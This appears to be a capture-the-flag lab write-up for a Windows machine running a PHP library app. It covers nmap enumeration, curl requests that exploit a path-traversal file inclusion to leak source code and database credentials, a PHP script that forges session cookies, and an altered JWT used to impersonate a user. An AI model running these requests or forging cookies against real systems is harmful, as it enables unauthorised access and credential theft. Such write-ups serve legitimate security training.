![image](https://user-images.githubusercontent.com/68326057/117789186-b13df200-b265-11eb-92dc-65c752d8861b.png)

# NMAP

```bash
PORT      STATE SERVICE       REASON  VERSION
22/tcp    open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD1/bmEHFv3nRSf2uH/akLLIfkmpxbSWiVReOdwmJrM2iD9g1gqVHIceIxat222PnYkLHYG23lUQMiTXcvuwBHeB+dMUNv09IHDKCCT9XOTWc+900zrFLRoyR6LQ2O3vQ+JgWpWlvtZAV6FvcSSK3ai767qIdBNG8SAxwwQZlSxX7D/n28VJlPcXXtzoiSt+lQ1T1sq7qIXPM2CyY7qoTLjcvDz/IYqbXbinsLLOCZ9MnRnDbE8E9tLeAJGcxhpNgk0LNN6xGbj49zVhy1TRrVNhh4RD+uczVqufMQIHdCnL61p9ZIepQxhJvwSf4IHH+oaM6wy3Yu0W6pg5wQWXIkj
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPvEspRGrd2/vma82j25vli6C/Td5Gvl44e9IhXeZOlvojawx4tbo/OdBytc+X9b/OSP01kLK4Od62NrQmN39s=
|   256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII+TY3313X2GdjXH6r6IrDURWI4H4itbZG41GaktT00D

80/tcp    open  http          syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library

135/tcp   open  msrpc         syn-ack Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn

443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

445/tcp   open  microsoft-ds? syn-ack

3306/tcp  open  mysql?        syn-ack
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, NULL, RPCCheck, TerminalServer, WMSRequest, X11Probe, afp: 
|_    Host '10.10.14.21' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '10.10.14.21' is not allowed to connect to this MariaDB server

5040/tcp  open  unknown       syn-ack

7680/tcp  open  pando-pub?    syn-ack

49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=5/11%Time=609A952C%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOptions,
SF:4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck,4A,"F\
SF:0\0\x01\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allowed\x20to\
SF:x20connect\x20to\x20this\x20MariaDB\x20server")%r(X11Probe,4A,"F\0\0\x0
SF:1\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allowed\x20to\x20con
SF:nect\x20to\x20this\x20MariaDB\x20server")%r(FourOhFourRequest,4A,"F\0\0
SF:\x01\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalServer,4A,"F\0\0
SF:\x01\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allowed\x20to\x20
SF:connect\x20to\x20this\x20MariaDB\x20server")%r(WMSRequest,4A,"F\0\0\x01
SF:\xffj\x04Host\x20'10\.10\.14\.21'\x20is\x20not\x20allowed\x20to\x20conn
SF:ect\x20to\x20this\x20MariaDB\x20server")%r(afp,4A,"F\0\0\x01\xffj\x04Ho
SF:st\x20'10\.10\.14\.21'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x
SF:20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5h23m04s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 41772/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 9573/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 57318/udp): CLEAN (Timeout)
|   Check 4 (port 51923/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-11T09:10:46
|_  start_date: N/A
```

# SMB

![image](https://user-images.githubusercontent.com/68326057/117789825-59ec5180-b266-11eb-82e5-eb41e7b15341.png)

--> Guest,guest ,''  access denied

with smbclient also
![image](https://user-images.githubusercontent.com/68326057/117790030-95871b80-b266-11eb-90ba-e795eff7d6f4.png)

# WEB

--> https://10.10.10.228/portal/php/users.php

![image](https://user-images.githubusercontent.com/68326057/117791297-c7e54880-b267-11eb-87f2-397e428800c3.png)

usernames:-

```bash
alex
paul	
jack
olivia
john
emma
william
lucas
sirine
juliette
support
````

![image](https://user-images.githubusercontent.com/68326057/117791413-ee0ae880-b267-11eb-9740-38ace877707d.png)


![image](https://user-images.githubusercontent.com/68326057/117792244-be101500-b268-11eb-8d58-89f8a03f8b85.png)

Cookie token:-

![image](https://user-images.githubusercontent.com/68326057/117792499-f6afee80-b268-11eb-840b-4bac96f1f10a.png)

Change the name to paul:-

![image](https://user-images.githubusercontent.com/68326057/117794033-768a8880-b26a-11eb-83d2-3f7bc6910670.png)


```bash
$ curl http://10.10.10.228/portal/php/files.php --cookie "PHPSESSID=test1e9549a0bf4b172e168a9ca5cbaa6fdb;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.v7sPn4LCA0KEKjFlz6iFWjNYIfImvNn-qE-FRqU1Xa8"
```

```html
<html lang="en">
    <head>
        <title>Binary</title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <link rel="stylesheet" type="text/css" href="../assets/css/main.css">
        <link rel="stylesheet" type="text/css" href="../assets/css/all.css">
    </head>

    <nav class="navbar navbar-default justify-content-end">
        <div class="navbar-header justify-content-end">
            <button type="button" class="navbar-toggle btn btn-outline-info p-3 m-3" data-toggle="collapse" data-target=".navbar-collapse"><i class="fas fa-hamburger"></i></button>
        </div>

        <div class="collapse navbar-collapse justify-content-end mr-5">
             <ul class="navbar-nav">
                <li class="nav-item"><a class="nav-link text-right" href="../index.php"><i class="fas fa-home"></i> Home</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="issues.php"><i class="fa fa-check" aria-hidden="true"></i> Issues</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="users.php"><i class="fa fa-user" aria-hidden="true"></i> User Management</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="#"><i class="fa fa-file" aria-hidden="true"></i> File Management</a></li>
                <li class="nav-item"><a class="nav-link text-right" href="../auth/logout.php"><i class="fas fa-sign-out-alt"></i> Logout</a></li>
             </ul>
        </div>
    </nav>
    <body class="bg-dark">
        <main class="main">
            <div class="row justify-content-center text-white text-center">
                <div class="col-md-3">
                    <h1>Task Submission</h1>
                    <p class="text-danger"><i class="fas fa-exclamation-circle"></i> Please upload only .zip files!</p>
                    <form onsubmit="return false">
                        <div class="form-group mt-5">
                            <input type="text" class="form-control" placeholder="Task completed" id="task" name="task">
                        </div>
                        <div class="form-group">
                            <input type="file" class="form-control" placeholder="Task" id="file" name="file">
                        </div>
                        <button type="submit" class="btn btn-outline-success btn-block py-3" id="upload">Upload</button>
                    </form>
                    <p id="message"></p>
                </div>
            </div>
        </div>
        </main>

        <footer>
    <div class="footer-copyright text-white text-center mt-5">
        <p>&copy; 2021<a href="https://github.com/helich0pper" target="_blank"> helich0pper</a></p>
    </div>
</footer>        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
        <script type="text/javascript" src='../assets/js/files.js'></script>
    </body>


</html>
```

1. saving the file as index.html
2. hosting a python server to take a look at that file


![image](https://user-images.githubusercontent.com/68326057/117794799-324bb800-b26b-11eb-96c4-c0c4ad422d92.png)


## --> File.html

![image](https://user-images.githubusercontent.com/68326057/117794884-45f71e80-b26b-11eb-8b16-0ded035e62d0.png)

![image](https://user-images.githubusercontent.com/68326057/117795234-9d958a00-b26b-11eb-9c40-c09b46e69b8c.png)

Not submitting anywhere ;_;

![image](https://user-images.githubusercontent.com/68326057/117796495-c4a08b80-b26c-11eb-8b6e-d935a5240497.png)

![image](https://user-images.githubusercontent.com/68326057/117796601-deda6980-b26c-11eb-9d6c-210285b976fc.png)


--> https://10.10.10.228/php/books.php

![image](https://user-images.githubusercontent.com/68326057/117796801-07fafa00-b26d-11eb-846b-125aaf910dd2.png)


![image](https://user-images.githubusercontent.com/68326057/117796882-19440680-b26d-11eb-8db5-7c738739f211.png)

## LFI

```bash
 curl -XPOST -d "book=../index.html&method=1" http://10.10.10.228/includes/bookController.php
```
```html
<br />
<b>Warning</b>:  file_get_contents(../books/../index.html): Failed to open stream: No such file or directory in <b>C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php</b> on line <b>28</b><br />
false
```

![image](https://user-images.githubusercontent.com/68326057/117799090-6628dc80-b26f-11eb-9b41-cb5c7fd0d278.png)

```bash
curl -XPOST -d "book=../db/db.php&method=1" http://10.10.10.228/includes/bookController.php
```

```php
"<?php\r\n\r\n$host=\"localhost\";\r\n$port=3306;\r\n$user=\"bread\";\r\n$password=\"jUli901\";\r\n$dbname=\"bread\";\r\n\r\n$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());\r\n?>\r\n"
```

## CREDS

```bash
bread:jUli901
```

MYSQL

![image](https://user-images.githubusercontent.com/68326057/117799532-dc2d4380-b26f-11eb-9001-27f298cade9e.png)

SMBCLIENT

![image](https://user-images.githubusercontent.com/68326057/117799583-e8190580-b26f-11eb-9916-f0a2e29550ec.png)

SSH

![image](https://user-images.githubusercontent.com/68326057/117799739-0da60f00-b270-11eb-9089-3ca63b825b2e.png)


```bash
curl  -XPOST -d "book=../portal/signup.php&method=1" http://10.10.10.228/includes/bookController.php
```

![image](https://user-images.githubusercontent.com/68326057/117801801-54950400-b272-11eb-9dca-7a834525b2ad.png)


```bash
curl  -XPOST -d "book=../portal/authController.php&method=1" http://10.10.10.228/includes/bookController.php > auth.php
```

![image](https://user-images.githubusercontent.com/68326057/117802879-9d00f180-b273-11eb-95b2-8d5218352df1.png)

cookie.php

```bash
curl  -XPOST -d "book=../portal/cookie.php&method=1" http://10.10.10.228/includes/bookController.php > cookie.php
```

![image](https://user-images.githubusercontent.com/68326057/117803220-fec15b80-b273-11eb-9f0e-de7e956c7bcf.png)

Modified code:-

```php
<?php

$username="paul";
$max = strlen($username) - 1;
$seed = rand(0, $max);
$key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
$session_cookie = $username.md5($key);

echo $session_cookie;

?>
```

![image](https://user-images.githubusercontent.com/68326057/117803761-9e7ee980-b274-11eb-83c1-9fd39af858ba.png)


NOW I CAN SUBMIT 

![image](https://user-images.githubusercontent.com/68326057/117803891-c0786c00-b274-11eb-813d-bb45c066461e.png)

![image](https://user-images.githubusercontent.com/68326057/117804271-354ba600-b275-11eb-8b4d-8db009b983bb.png)

FILE.php

![image](https://user-images.githubusercontent.com/68326057/117808801-f587bd00-b27a-11eb-93c7-6b21f8c20f05.png)


then found juliette password in pizzadileveryuserdata in json file

![image](https://user-images.githubusercontent.com/68326057/117808947-27008880-b27b-11eb-819d-6f6f0df9ac27.png)

# USER -juliette

![image](https://user-images.githubusercontent.com/68326057/117809547-eead7a00-b27b-11eb-8f34-dc8533d6f895.png)

